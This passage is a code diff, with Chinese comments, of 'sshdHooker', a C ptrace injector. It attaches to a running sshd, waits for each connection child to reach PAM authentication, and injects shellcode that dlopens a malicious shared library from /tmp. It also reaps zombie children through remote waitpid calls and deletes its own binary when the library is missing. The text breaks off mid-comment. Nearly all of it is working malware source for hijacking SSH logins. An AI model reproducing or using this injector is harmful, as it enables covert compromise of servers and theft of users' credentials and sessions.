@@ -1,59 +1,95 @@
-#include <stdlib.h>
-#include <pthread.h>
+/*
+ * sshdHooker 注入器 (x86_64)
+ *
+ * 整体流程:
+ *   1. main: attach 到 sshd 主进程, 通过 PTRACE_SYSCALL 监控 clone(56) 调用,
+ *      每次 sshd fork 出处理连接的子进程时, 创建一个 pthread 去跟踪它
+ *   2. wait_for_libpam 线程: attach 到 sshd 子进程, 监听其系统调用,
+ *      等它 open/openat "login.defs"(进入 PAM 认证阶段的特征)时执行注入
+ *   3. inject_shellcode: 远程调用 mmap 在子进程内分配 RWX 内存,
+ *      写入 so 路径与 shellcode, 跳转执行完成 dlopen 加载恶意 so
+ *   4. manual_gc: 子进程退出后, 在 sshd 主进程内远程调用 waitpid
+ *      回收僵尸子进程(修复 ptrace 接管后 sshd 自身无法回收子进程的问题)
+ *
+ * 编译: gcc sshdHooker.c shellcode.s -g -o inject -ldl -lpthread
+ * 用法: sudo ./inject <sshd_pid>
+ */
+
 #include <stdio.h>
-#include <signal.h> 
+#include <stdlib.h>
+#include <string.h>
 #include <unistd.h>
-#include <sys/ptrace.h>
-#include <sys/types.h>
-#include <sys/wait.h>
-#include <sys/user.h>
-#include <sys/reg.h>
+#include <signal.h>
+#include <pthread.h>
+#include <dlfcn.h>
 #include <link.h>
 #include <sys/mman.h>
+#include <sys/ptrace.h>
+#include <sys/reg.h>
 #include <sys/stat.h>
-#include <dlfcn.h>
-#include <signal.h>
-#include <string.h>
+#include <sys/types.h>
+#include <sys/user.h>
 #include <sys/wait.h>
-char evilSoPath[] = "/tmp/hello.so";
-char libcRegEx[] = "libc-";
-struct gcStack {
-    struct gcStack * up;
-    pid_t * target_pid;
-} * gcs;
+
+/* 恶意 so 落盘路径, 注入时写入目标进程供 shellcode dlopen */
+char evil_so_path[] = "/tmp/hello.so";
+
+/*
+ * 在 /proc/pid/maps 中匹配 libc 的特征串.
+ * 预留较大空间: 找不到 "libc-" 时会 strcpy 成 "libc.so" (原长度不够会越界).
+ */
+char libc_pattern[64] = "libc-";
+
+/*
+ * 待回收子进程的链式栈.
+ * wait_for_libpam 线程在子进程退出后把节点压栈(prev 指向原栈顶),
+ * main 循环检测到栈顶不是哨兵节点时, 执行 manual_gc 并弹栈.
+ */
+struct gc_stack {
+    struct gc_stack *prev;
+    pid_t target_pid;
+} *gc_stack_top;
+
+/* ======================= ptrace 基础封装 ======================= */
+
+/* 在 ptrace_call 中会被提前调用, 先做前向声明 */
+int ptrace_getregs(pid_t pid, struct user_regs_struct *regs);
+int ptrace_setregs(pid_t pid, struct user_regs_struct *regs);
+int ptrace_continue(pid_t pid);
+
+/* 按 word 读取目标进程内存(当前未使用, 保留作调试工具) */
 int ptrace_read(int pid, unsigned long addr, void *data, unsigned int len)
 {
-    int bytesRead = 0;
+    int bytes_read = 0;
     int i = 0;
     long word = 0;
     unsigned long *ptr = (unsigned long *)data;
 
-    while (bytesRead < len)
-    {
-    word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytesRead, NULL);
-    if (word == -1)
-    {
-        fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
-        return 1;
-    }
-    bytesRead += sizeof(long);
-    if (bytesRead > len)
-    {
-        memcpy(ptr + i, &word, sizeof(long) - (bytesRead - len));
-        break;
-    }
-    ptr[i++] = word;
+    while (bytes_read < len) {
+        word = ptrace(PTRACE_PEEKTEXT, pid, addr + bytes_read, NULL);
+        if (word == -1) {
+            fprintf(stderr, "ptrace(PTRACE_PEEKTEXT) failed\n");
+            return 1;
+        }
+        bytes_read += sizeof(long);
+        if (bytes_read > len) {
+            /* 末尾不足一个 word, 只拷贝有效字节 */
+            memcpy(ptr + i, &word, sizeof(long) - (bytes_read - len));
+            break;
+        }
+        ptr[i++] = word;
     }
 
     return 0;
 }
 
-
-int ptrace_readdata( pid_t pid,  uint8_t *src, uint8_t *buf, size_t size )
+/* 按 4 字节为单位将目标进程内存读入 buf */
+int ptrace_readdata(pid_t pid, uint8_t *src, uint8_t *buf, size_t size)
 {
     uint32_t i, j, remain;
     uint8_t *laddr;
 
+    /* 利用 union 以 long 对齐读取, 再按字节拷贝, 规避对齐问题 */
     union u {
         long val;
         char chars[sizeof(long)];
@@ -64,25 +100,23 @@ int ptrace_readdata( pid_t pid,  uint8_t *src, uint8_t *buf, size_t size )
 
     laddr = buf;
 
-    for ( i = 0; i < j; i ++ )
-    {
-         d.val = ptrace( PTRACE_PEEKTEXT, pid, src, 0 );
-         memcpy( laddr, d.chars, 4 );
-         src += 4;
-         laddr += 4;
+    for (i = 0; i < j; i++) {
+        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
+        memcpy(laddr, d.chars, 4);
+        src += 4;
+        laddr += 4;
     }
 
-    if ( remain > 0 )
-    {
-        d.val = ptrace( PTRACE_PEEKTEXT, pid, src, 0 );
-        memcpy( laddr, d.chars, remain );
+    if (remain > 0) {
+        d.val = ptrace(PTRACE_PEEKTEXT, pid, src, 0);
+        memcpy(laddr, d.chars, remain);
     }
 
     return 0;
-
 }
 
-int ptrace_writedata( pid_t pid, uint8_t *dest, uint8_t *data, size_t size )
+/* 按 4 字节为单位把 data 写入目标进程内存, 末尾先读后写避免覆盖多余字节 */
+int ptrace_writedata(pid_t pid, uint8_t *dest, uint8_t *data, size_t size)
 {
     uint32_t i, j, remain;
     uint8_t *laddr;
@@ -94,207 +128,187 @@ int ptrace_writedata( pid_t pid, uint8_t *dest, uint8_t *data, size_t size )
 
     j = size / 4;
     remain = size % 4;
-    
+
     laddr = data;
-    
-    for ( i = 0; i < j; i ++ )
-    {
-        memcpy( d.chars, laddr, 4 );
-        ptrace( PTRACE_POKETEXT, pid, dest, d.val );
-    
-        dest  += 4;
+
+    for (i = 0; i < j; i++) {
+        memcpy(d.chars, laddr, 4);
+        ptrace(PTRACE_POKETEXT, pid, dest, d.val);
+
+        dest += 4;
         laddr += 4;
     }
 
-    if ( remain > 0 )
-    {
-        d.val = ptrace( PTRACE_PEEKTEXT, pid, dest, 0 );
-        for ( i = 0; i < remain; i ++ )
-        {
-            d.chars[i] = *laddr ++;
+    if (remain > 0) {
+        /* 不足 4 字节的部分: 先读出一个 word, 改写有效字节后写回 */
+        d.val = ptrace(PTRACE_PEEKTEXT, pid, dest, 0);
+        for (i = 0; i < remain; i++) {
+            d.chars[i] = *laddr++;
         }
 
-        ptrace( PTRACE_POKETEXT, pid, dest, d.val );
-        
+        ptrace(PTRACE_POKETEXT, pid, dest, d.val);
     }
 
     return 0;
 }
 
-
-int ptrace_writestring( pid_t pid, uint8_t *dest, char *str  )
+/* 向目标进程写入一个字符串(含结尾 '\0') */
+int ptrace_writestring(pid_t pid, uint8_t *dest, char *str)
 {
-    return ptrace_writedata( pid, dest, str, strlen(str)+1 );
+    return ptrace_writedata(pid, dest, (uint8_t *)str, strlen(str) + 1);
 }
 
-int ptrace_call( pid_t pid, uint64_t addr, long *params, uint32_t num_params, struct user_regs_struct* regs ,int is_trap)
+/*
+ * 在目标进程中远程调用 addr 处的函数.
+ * params/num_params 为参数列表: 前 6 个走 rdi/rsi/rdx/rcx/r8/r9, 其余压栈.
+ * is_trap:
+ *   0 - 在栈顶写入 int 0x80 + int3, 被调函数返回后陷入 trap, 控制权交回 tracer
+ *   1 - 在栈顶写入原 rip 作为返回地址, 执行完回到原位置
+ */
+int ptrace_call(pid_t pid, uint64_t addr, long *params, uint32_t num_params,
+                struct user_regs_struct *regs, int is_trap)
 {
-    
     uint32_t i;
 
-    long *regs_param[7]={
-        (long*)&(regs->rdi),
-        (long*)&(regs->rsi),
-        (long*)&(regs->rdx),
-        (long*)&(regs->rcx),
-        (long*)&(regs->r8),
-        (long*)&(regs->r9)
+    long *regs_param[6] = {
+        (long *)&(regs->rdi),
+        (long *)&(regs->rsi),
+        (long *)&(regs->rdx),
+        (long *)&(regs->rcx),
+        (long *)&(regs->r8),
+        (long *)&(regs->r9)
     };
 
-    // 前6个参数压寄存器
-    for ( i = 0; i < num_params && i < 6; i ++ )
-    {
-        // params_reg[i] = params[i];
-        memcpy(regs_param[i],&params[i],sizeof(long));
+    /* 前 6 个参数放入寄存器 */
+    for (i = 0; i < num_params && i < 6; i++) {
+        memcpy(regs_param[i], &params[i], sizeof(long));
     }
 
-    
-    // 超过6个压栈
-    if ( i < num_params )
-    {
-        regs->rsp -= (num_params - i) * sizeof(long) ;
-        ptrace_writedata( pid, (void *)regs->rsp, (uint8_t *)&params[i], (num_params - i) * sizeof(long) );
+    /* 超过 6 个的参数压栈 */
+    if (i < num_params) {
+        regs->rsp -= (num_params - i) * sizeof(long);
+        ptrace_writedata(pid, (uint8_t *)regs->rsp, (uint8_t *)&params[i],
+                         (num_params - i) * sizeof(long));
     }
-    regs->rsp -= sizeof(long) ;
-    if(is_trap == 0){
-        char code[] = {0xcd,0x80,0xcc,0};//调用中断
 
-        //ptrace_writedata( pid, (void *)regs->rip, (uint8_t *)&code, 4 );
-
-        ptrace_writedata( pid, (void *)regs->rsp, (uint8_t *)&code, 4 );
-    }else{
-        ptrace_writedata( pid, (void *)regs->rsp, (uint8_t *)&regs->rip, sizeof(long) );
+    regs->rsp -= sizeof(long);
+    if (is_trap == 0) {
+        /* int 0x80 + int3: 被调函数 ret 到这里后触发 trap, 停回 tracer */
+        uint8_t code[] = {0xcd, 0x80, 0xcc, 0};
+        ptrace_writedata(pid, (uint8_t *)regs->rsp, code, 4);
+    } else {
+        /* 把原 rip 写到栈顶, 作为被调函数的返回地址 */
+        ptrace_writedata(pid, (uint8_t *)regs->rsp, (uint8_t *)&regs->rip, sizeof(long));
     }
-    
+
     regs->rip = addr;
-    if ( ptrace_setregs( pid, regs ) == -1 
-        || ptrace_continue( pid ) == -1 )
-    {
+    if (ptrace_setregs(pid, regs) == -1 || ptrace_continue(pid) == -1) {
         return -1;
     }
 
+    /* 等待目标进程在 trap 处停下 */
+    waitpid(pid, NULL, WUNTRACED);
 
-    waitpid( pid, NULL, WUNTRACED );
-    
     return 0;
 }
 
-
-
-int ptrace_getregs( pid_t pid, struct user_regs_struct* regs )
+int ptrace_getregs(pid_t pid, struct user_regs_struct *regs)
 {
-    if ( ptrace( PTRACE_GETREGS, pid, NULL, regs ) < 0 )
-    {
-        printf( "- [Getregs][%d] Can not get register values\n",pid );
+    if (ptrace(PTRACE_GETREGS, pid, NULL, regs) < 0) {
+        printf("- [Getregs][%d] Can not get register values\n", pid);
         return -1;
     }
 
     return 0;
 }
 
-int ptrace_setregs( pid_t pid, struct user_regs_struct* regs )
+int ptrace_setregs(pid_t pid, struct user_regs_struct *regs)
 {
-    if ( ptrace( PTRACE_SETREGS, pid, NULL, regs ) < 0 )
-    {
-        printf( "- [Setregs][%d] Can not set register values\n",pid );
+    if (ptrace(PTRACE_SETREGS, pid, NULL, regs) < 0) {
+        printf("- [Setregs][%d] Can not set register values\n", pid);
         return -1;
     }
 
     return 0;
 }
 
-
-
-
-int ptrace_continue( pid_t pid )
+int ptrace_continue(pid_t pid)
 {
-    if ( ptrace( PTRACE_CONT, pid, NULL, 0 ) < 0 )
-        {
-            perror( "ptrace_cont" );
-            return -1;
-        }
-
-        return 0;
-}
-
-int ptrace_attach( pid_t pid )
-{
-    if ( ptrace( PTRACE_ATTACH, pid, NULL, 0  ) < 0 )
-    {
-        perror( "ptrace_attach" );
+    if (ptrace(PTRACE_CONT, pid, NULL, 0) < 0) {
+        perror("ptrace_cont");
         return -1;
     }
-
-    waitpid( pid, NULL, WUNTRACED );
-
-    //DEBUG_PRINT("attached\n");
-
-    if ( ptrace( PTRACE_SYSCALL, pid, NULL, 0  ) < 0 )
-    {
-        perror( "ptrace_syscall" );
-        return -1;
-    }
-
-
-
-    waitpid( pid, NULL, WUNTRACED );
 
     return 0;
 }
 
-int ptrace_detach( pid_t pid )
+/* attach 并让目标进程停在系统调用入口, 随后可配合 PTRACE_SYSCALL 监听 */
+int ptrace_attach(pid_t pid)
 {
-    if ( ptrace( PTRACE_DETACH, pid, NULL, 0 ) < 0 )
-        {
-            perror( "ptrace_detach" );
-            return -1;
-        }
+    if (ptrace(PTRACE_ATTACH, pid, NULL, 0) < 0) {
+        perror("ptrace_attach");
+        return -1;
+    }
 
-        return 0;
+    waitpid(pid, NULL, WUNTRACED);
+
+    if (ptrace(PTRACE_SYSCALL, pid, NULL, 0) < 0) {
+        perror("ptrace_syscall");
+        return -1;
+    }
+
+    waitpid(pid, NULL, WUNTRACED);
+
+    return 0;
 }
 
-void get_libc_path( pid_t pid, char* path )
+int ptrace_detach(pid_t pid)
+{
+    if (ptrace(PTRACE_DETACH, pid, NULL, 0) < 0) {
+        perror("ptrace_detach");
+        return -1;
+    }
+
+    return 0;
+}
+
+/* ======================= 目标进程模块信息 ======================= */
+
+/* 解析 /proc/pid/maps, 取目标进程 libc 的完整路径 */
+void get_libc_path(pid_t pid, char *path)
 {
     FILE *fp;
-    long addr = 0;
-    char *pch;
     char filename[32];
     char line[1024];
 
-    if ( pid < 0 )
-    {
-        /* self process */
-        snprintf( filename, sizeof(filename), "/proc/self/maps", pid );
-    }
-    else
-    {
-        snprintf( filename, sizeof(filename), "/proc/%d/maps", pid );
+    if (pid < 0) {
+        /* pid < 0 表示读取自身进程 */
+        snprintf(filename, sizeof(filename), "/proc/self/maps");
+    } else {
+        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
     }
 
-    fp = fopen( filename, "r" );
-
-    if ( fp != NULL )
-    {
-        while ( fgets( line, sizeof(line), fp ) )
-        {
-            if ( strstr( line, libcRegEx ) )
-            {
-               
-                 char *m = strrchr(line,' ');
-                char *tmp=strchr(m,'\n');
-                *tmp='\0';
-                m = m+1;
-                strcpy(path,m);
+    fp = fopen(filename, "r");
+    if (fp != NULL) {
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, libc_pattern)) {
+                /* 行末最后一个空格之后即是 so 的绝对路径 */
+                char *m = strrchr(line, ' ');
+                char *tmp = strchr(m, '\n');
+                *tmp = '\0';
+                m = m + 1;
+                strcpy(path, m);
                 break;
             }
         }
-
-                fclose( fp ) ;
+        fclose(fp);
     }
 
     return;
 }
-void* get_module_base( pid_t pid, const char* module_name )
+
+/* 解析 /proc/pid/maps, 取 module_name 在目标进程中的加载基址 */
+void *get_module_base(pid_t pid, const char *module_name)
 {
     FILE *fp;
     long addr = 0;
@@ -302,327 +316,358 @@ void* get_module_base( pid_t pid, const char* module_name )
     char filename[32];
     char line[1024];
 
-    if ( pid < 0 )
-    {
-        /* self process */
-        snprintf( filename, sizeof(filename), "/proc/self/maps", pid );
-    }
-    else
-    {
-        snprintf( filename, sizeof(filename), "/proc/%d/maps", pid );
+    if (pid < 0) {
+        /* pid < 0 表示读取自身进程 */
+        snprintf(filename, sizeof(filename), "/proc/self/maps");
+    } else {
+        snprintf(filename, sizeof(filename), "/proc/%d/maps", pid);
     }
 
-    fp = fopen( filename, "r" );
+    fp = fopen(filename, "r");
+    if (fp != NULL) {
+        while (fgets(line, sizeof(line), fp)) {
+            if (strstr(line, module_name)) {
+                /* 行首地址形如 "起始-结束", 取 '-' 前的起始地址 */
+                pch = strtok(line, "-");
+                addr = strtoul(pch, NULL, 16);
 
-    if ( fp != NULL )
-    {
-        while ( fgets( line, sizeof(line), fp ) )
-        {
-            if ( strstr( line, module_name ) )
-            {
-                pch = strtok( line, "-" );
-                addr = strtoul( pch, NULL, 16 );
-
-                if ( addr == 0x8000 )
+                if (addr == 0x8000) {
+                    /* 0x8000 是静态 PIE 主程序在 maps 中的起始, 不是 so 基址 */
                     addr = 0;
+                }
 
                 break;
             }
         }
-
-                fclose( fp ) ;
+        fclose(fp);
     }
 
     return (void *)addr;
 }
-void* get_remote_addr( pid_t target_pid, const char* module_name, void* local_addr )
+
+/*
+ * 利用同一 so 在本进程与目标进程中的基址差, 把本进程内的地址
+ * 换算成目标进程中的对应地址(同名 so 各进程内偏移一致).
+ */
+void *get_remote_addr(pid_t target_pid, const char *module_name, void *local_addr)
 {
-    void* local_handle, *remote_handle;
+    void *local_base = get_module_base(-1, module_name);
+    void *remote_base = get_module_base(target_pid, module_name);
 
-    local_handle = get_module_base( -1, module_name );
-    remote_handle = get_module_base( target_pid, module_name );
-
-    //printf( "+ get_remote_addr: local[%x], remote[%x]\n", local_handle, remote_handle );
-
-    return (void *)(local_addr-local_handle+remote_handle  );
+    return (void *)((uint64_t)local_addr - (uint64_t)local_base + (uint64_t)remote_base);
 }
 
+/* ======================= 业务逻辑 ======================= */
 
-
-//=====================utils end=====================
-
-void ManualGC(pid_t target_pid){
-    struct user_regs_struct regs,original_regs;
+/*
+ * 在 sshd 主进程中远程循环调用 waitpid(-1, NULL, WNOHANG),
+ * 回收因被注入/跟踪而遗留的僵尸子进程.
+ */
+void manual_gc(pid_t target_pid)
+{
+    struct user_regs_struct regs, original_regs;
     char libc_path[255];
-    void * handle = dlopen(libc_path,RTLD_LAZY);
-    get_libc_path(target_pid,libc_path);
-    void * self_waitpid_addr = dlsym(handle,"waitpid");
-    printf("+ [ManualGC][%d] Self Waitpid address:%p\n",target_pid,self_waitpid_addr);
-    void* libc_moudle_base = get_module_base(-1,libcRegEx);
-    void* waitpid_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_waitpid_addr );
-    printf("+ [ManualGC][%d] Remote Waitpid address:%p\n",target_pid,waitpid_addr);
-    if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-        printf("- [ManualGC][%d] Getregs Error,target: %d\n",target_pid,target_pid );
-        return -1;
+
+    /*
+     * 注意: 此处先用未初始化的 libc_path 去 dlopen, handle 通常为 NULL,
+     * 而 dlsym(NULL, ...) 会转而搜索本进程的全局符号表, 因此仍能取到
+     * 本进程 waitpid 的地址. 保持此调用顺序与原实现一致.
+     */
+    void *handle = dlopen(libc_path, RTLD_LAZY);
+    get_libc_path(target_pid, libc_path);
+    void *self_waitpid_addr = dlsym(handle, "waitpid");
+    printf("+ [ManualGC][%d] Self waitpid address: %p\n", target_pid, self_waitpid_addr);
+    void *waitpid_addr = get_remote_addr(target_pid, libc_pattern, self_waitpid_addr);
+    printf("+ [ManualGC][%d] Remote waitpid address: %p\n", target_pid, waitpid_addr);
+
+    if (ptrace_getregs(target_pid, &regs) == -1) {
+        printf("- [ManualGC][%d] Getregs error, target: %d\n", target_pid, target_pid);
+        return;
     }
-    memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
-    while(1){
+    memcpy(&original_regs, &regs, sizeof(struct user_regs_struct));
+
+    while (1) {
         long parameters[3];
-        parameters[0] = -1;      
-        parameters[1] = NULL; 
-        parameters[2] = WNOHANG ; 
-        if(ptrace_call( target_pid, (uint64_t)waitpid_addr, parameters, 3,&regs,0 )==-1){
-                printf("- [ManualGC][%d] Writedata Error\n",target_pid );
-                return -1;
+        parameters[0] = -1; /* 任意子进程 */
+        parameters[1] = 0;  /* 状态输出缓冲(wstatus 传 NULL) */
+        parameters[2] = WNOHANG;
+        if (ptrace_call(target_pid, (uint64_t)waitpid_addr, parameters, 3, &regs, 0) == -1) {
+            printf("- [ManualGC][%d] Writedata error\n", target_pid);
+            return;
         }
-        ptrace_getregs( target_pid, &regs ); // 获得调用结果
+        ptrace_getregs(target_pid, &regs); /* rax 即 waitpid 返回值 */
         int retval = regs.rax;
-        printf("+ [ManualGC][%d] waitpid = %ld \n",target_pid,retval );
-        if(retval == -1||retval == 0||retval == 4294967295){ // 4294967295 == -1
+        printf("+ [ManualGC][%d] waitpid = %ld\n", target_pid, (long)retval);
+        if (retval == -1 || retval == 0 || retval == 4294967295) { /* 4294967295 == (unsigned)-1 */
+            /* -1 出错 / 0 暂无已退出的子进程, 回收结束 */
             break;
         }
     }
-    
 
-    ptrace_setregs( target_pid, &original_regs );
-    ptrace_continue( target_pid );
-
-
+    /* 恢复寄存器并让主进程继续运行 */
+    ptrace_setregs(target_pid, &original_regs);
+    ptrace_continue(target_pid);
 }
 
-int Inject_Shellcode(pid_t target_pid){
-        struct user_regs_struct regs, original_regs;
-        void *malloc_addr, *dlopen_mode_addr,*mmap_addr;
-        uint8_t *remote_code_ptr,*local_code_ptr;
-        uint32_t code_length;
-        char libc_path[255];
-        FILE *fp;
-        
-        
-        fp = fopen(evilSoPath,"r");
-        if(fp == NULL){
-            printf("! [Inject][%d] Cannot find so file, Exit and remove",target_pid);
-            char buf[ 1024 ];
-	        int count;
-	        count = readlink( "/proc/self/exe", buf, 1024 );
-	        if ( count < 0 || count >= 1024 )
-	        { 
-                exit(0);
-	        }
-	        buf[ count ] = '\0';
-	        char cmd[1024];
-            snprintf(cmd,2048,"rm %s",buf);
-            system(cmd);
+/*
+ * 向目标进程注入恶意 so:
+ *   1. 远程调用 mmap 分配一块 RWX 匿名内存
+ *   2. 写入 so 路径字符串与 shellcode
+ *   3. 修改 rip 跳入 shellcode, 由其远程调用 dlopen 完成加载
+ */
+int inject_shellcode(pid_t target_pid)
+{
+    struct user_regs_struct regs, original_regs;
+    void *malloc_addr, *dlopen_mode_addr, *mmap_addr;
+    uint8_t *remote_code_ptr, *local_code_ptr;
+    uint32_t code_length;
+    char libc_path[255];
+    FILE *fp;
+
+    /* 恶意 so 不存在时删除自身(注入器)并退出, 避免残留 */
+    fp = fopen(evil_so_path, "r");
+    if (fp == NULL) {
+        printf("! [Inject][%d] Cannot find so file, exit and remove\n", target_pid);
+        char buf[1024];
+        int count = readlink("/proc/self/exe", buf, sizeof(buf) - 1);
+        if (count < 0 || count >= 1024) {
             exit(0);
-        }else{
-            fclose(fp);
         }
-        if ( ptrace_attach( target_pid ) == -1 ){
+        buf[count] = '\0';
+        char cmd[1024];
+        snprintf(cmd, sizeof(cmd), "rm %s", buf);
+        system(cmd);
+        exit(0);
+    } else {
+        fclose(fp);
+    }
 
-                printf("- [Inject][%d] inject attach failed\n",target_pid );
-                return -1;
-        }
-        printf ("+ [Inject][%d] Waiting for process...\n",target_pid);
-        printf ("+ [Inject][%d] Getting Registers\n",target_pid);
-        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-                printf("- Getregs Error\n" );
-                return -1;
-        }
-        memcpy(&original_regs,&regs,sizeof(struct user_regs_struct));
-        printf ("+ [Inject][%d] Injecting shell code at %p\n", target_pid,(void*)regs.rip);
-        
+    if (ptrace_attach(target_pid) == -1) {
+        printf("- [Inject][%d] inject attach failed\n", target_pid);
+        return -1;
+    }
+    printf("+ [Inject][%d] Waiting for process...\n", target_pid);
+    printf("+ [Inject][%d] Getting registers\n", target_pid);
+    if (ptrace_getregs(target_pid, &regs) == -1) {
+        printf("- [Inject][%d] Getregs error\n", target_pid);
+        return -1;
+    }
+    memcpy(&original_regs, &regs, sizeof(struct user_regs_struct));
+    printf("+ [Inject][%d] Injecting shellcode at %p\n", target_pid, (void *)regs.rip);
 
-        
-        void* libc_moudle_base = NULL;
-        libc_moudle_base = get_module_base(-1,libcRegEx);
-        get_libc_path(target_pid,libc_path);
-        if(libc_moudle_base==NULL){
-            printf("- [Inject][%d] Can't find libc-xxxx,try to find libc.so.x\n",target_pid);
-            char tmp_libc[] = "libc.so";
-            strcpy(libcRegEx,tmp_libc);
-            libc_moudle_base = get_module_base(-1,libcRegEx);
-            get_libc_path(target_pid,libc_path);
-        }
+    /* 优先按 "libc-" 匹配; 找不到再退化成 "libc.so"(musl 等环境) */
+    void *libc_module_base = get_module_base(-1, libc_pattern);
+    get_libc_path(target_pid, libc_path);
+    if (libc_module_base == NULL) {
+        printf("- [Inject][%d] Can't find libc-xxxx, try to find libc.so.x\n", target_pid);
+        char tmp_libc[] = "libc.so";
+        strcpy(libc_pattern, tmp_libc);
+        libc_module_base = get_module_base(-1, libc_pattern);
+        get_libc_path(target_pid, libc_path);
+    }
 
-        void * handle = dlopen(libc_path,RTLD_LAZY);
-        void * self_dlopen_mode_addr = dlsym(handle,"dlopen");
-        if(self_dlopen_mode_addr==NULL){
-            printf("- [Inject][%d] Can't find dlopen in libc,try to use __libc_dlopen_mode\n",target_pid);
-            self_dlopen_mode_addr = dlsym(handle,"__libc_dlopen_mode");
-        }
-        void * self_malloc_addr = dlsym(handle,"malloc");
-        void * self_mmap_addr = dlsym(handle,"mmap");
-        malloc_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_malloc_addr );
-        mmap_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_mmap_addr );
-        dlopen_mode_addr = get_remote_addr( target_pid, libcRegEx, (void *)self_dlopen_mode_addr );
-        
-        printf("+ [Inject][%d] self libc moudle base:%p\n",target_pid,libc_moudle_base);
-        printf("+ [Inject][%d] remote libc path:%s\n",target_pid,libc_path);
-        printf("+ [Inject][%d] self libc_dlopen_mode base:%p\n",target_pid,self_dlopen_mode_addr);
-        printf("+ [Inject][%d] remote malloc addr:%p\n",target_pid,malloc_addr);
-        printf("+ [Inject][%d] remote mmap addr:%p local:%p\n",target_pid,mmap_addr,self_mmap_addr);
-        printf("+ [Inject][%d] remote libc_dlopen_mode addr:%p\n",target_pid,dlopen_mode_addr);
+    /* 在本进程解析 dlopen/malloc/mmap 的地址, 再换算成目标进程中的地址 */
+    void *handle = dlopen(libc_path, RTLD_LAZY);
+    void *self_dlopen_mode_addr = dlsym(handle, "dlopen");
+    if (self_dlopen_mode_addr == NULL) {
+        printf("- [Inject][%d] Can't find dlopen in libc, try to use __libc_dlopen_mode\n", target_pid);
+        self_dlopen_mode_addr = dlsym(handle, "__libc_dlopen_mode");
+    }
+    void *self_malloc_addr = dlsym(handle, "malloc");
+    void *self_mmap_addr = dlsym(handle, "mmap");
+    malloc_addr = get_remote_addr(target_pid, libc_pattern, self_malloc_addr);
+    mmap_addr = get_remote_addr(target_pid, libc_pattern, self_mmap_addr);
+    dlopen_mode_addr = get_remote_addr(target_pid, libc_pattern, self_dlopen_mode_addr);
 
+    printf("+ [Inject][%d] self libc module base: %p\n", target_pid, libc_module_base);
+    printf("+ [Inject][%d] remote libc path: %s\n", target_pid, libc_path);
+    printf("+ [Inject][%d] self dlopen base: %p\n", target_pid, self_dlopen_mode_addr);
+    printf("+ [Inject][%d] remote malloc addr: %p\n", target_pid, malloc_addr);
+    printf("+ [Inject][%d] remote mmap addr: %p local: %p\n", target_pid, mmap_addr, self_mmap_addr);
+    printf("+ [Inject][%d] remote dlopen addr: %p\n", target_pid, dlopen_mode_addr);
 
+    /* 远程调用 mmap(NULL, 0x4000, RWX, MAP_ANONYMOUS|MAP_PRIVATE, 0, 0) */
+    long parameters[10];
+    parameters[0] = 0;                                   /* addr */
+    parameters[1] = 0x4000;                              /* length */
+    parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  /* prot */
+    parameters[3] = MAP_ANONYMOUS | MAP_PRIVATE;         /* flags */
+    parameters[4] = 0;                                   /* fd */
+    parameters[5] = 0;                                   /* offset */
 
+    if (ptrace_call(target_pid, (uint64_t)mmap_addr, parameters, 6, &regs, 0) == -1) {
+        printf("- [Inject][%d] Writedata error\n", target_pid);
+        return -1;
+    }
+    if (ptrace_getregs(target_pid, &regs) == -1) {
+        printf("- [Inject][%d] Getregs error\n", target_pid);
+        return -1;
+    }
+    printf("+ [Inject][%d] mmap result: %p\n", target_pid, (void *)regs.rax);
 
-        long parameters[10];
-        parameters[0] = 0;      // addr
-        parameters[1] = 0x4000; // size
-        parameters[2] = PROT_READ | PROT_WRITE | PROT_EXEC;  // prot
-        parameters[3] =  MAP_ANONYMOUS | MAP_PRIVATE; // flags
-        parameters[4] = 0; //fd
-        parameters[5] = 0; //offset
+    /* 先把 so 路径字符串写进 mmap 内存开头 */
+    remote_code_ptr = (uint8_t *)regs.rax;
+    ptrace_writedata(target_pid, remote_code_ptr, (uint8_t *)evil_so_path, strlen(evil_so_path) + 1);
+    printf("+ [Inject][%d] Writing evil so path at: %p\n", target_pid, remote_code_ptr);
 
-        if(ptrace_call( target_pid, (uint64_t)mmap_addr, parameters, 6,&regs,0 )==-1){
-                printf("- [Inject][%d]Writedata Error\n",target_pid );
-                return -1;
-        }
-        if ( ptrace_getregs( target_pid, &regs ) == -1 ){
-                printf("- [Inject][%d] Getregs Error\n",target_pid );
-                return -1;
-        }
-        printf("+ [Inject][%d] mmap result: %p\n",target_pid,regs.rax);
-        remote_code_ptr = (char *)regs.rax; //获取mmap取得的地址
-        ptrace_writedata(target_pid,remote_code_ptr,evilSoPath,strlen(evilSoPath)+1);
-        printf("+ [Inject][%d] Writing EvilSo Path at:%p\n",target_pid,remote_code_ptr);
-        parameters[1] = 0x2;      // addr
-        parameters[0] = remote_code_ptr; // size
-        extern uint64_t _dlopen_mode_param1_s, _dlopen_mode_addr_s,_inject_start_s,_inject_end_s;
-        memcpy((void*)((long)&_dlopen_mode_param1_s+2),&remote_code_ptr,sizeof(long));
-        memcpy((void*)((long)&_dlopen_mode_addr_s+2),&dlopen_mode_addr,sizeof(long));
-        remote_code_ptr += strlen(evilSoPath)+1;
-        local_code_ptr = (uint8_t *)&_inject_start_s;
-        code_length = (long)&_inject_end_s - (long)&_inject_start_s;
-        ptrace_writedata(target_pid,remote_code_ptr,local_code_ptr,code_length ); //写入本地shellcode
-        printf("+ [Inject][%d] Writing Shellcode at:%p code length:%d\n",target_pid,remote_code_ptr,code_length);
-        regs.rip = (long)remote_code_ptr+6;
-        ptrace_setregs( target_pid, &regs );
-        ptrace_continue( target_pid );
-        waitpid( target_pid, NULL, WUNTRACED  );
-        printf("+ [Inject][%d] EvilSo Injected.Recorver the regsing...\n",target_pid);
-        ptrace_setregs( target_pid, &original_regs );
-        
-        ptrace_continue( target_pid );
-        //ptrace_detach(target_pid);
-        
+    /*
+     * 把 so 路径地址与远程 dlopen 地址填入 shellcode 中的占位立即数:
+     * mov rdi, imm64 / movabs rax, imm64 的操作码均为 2 字节,
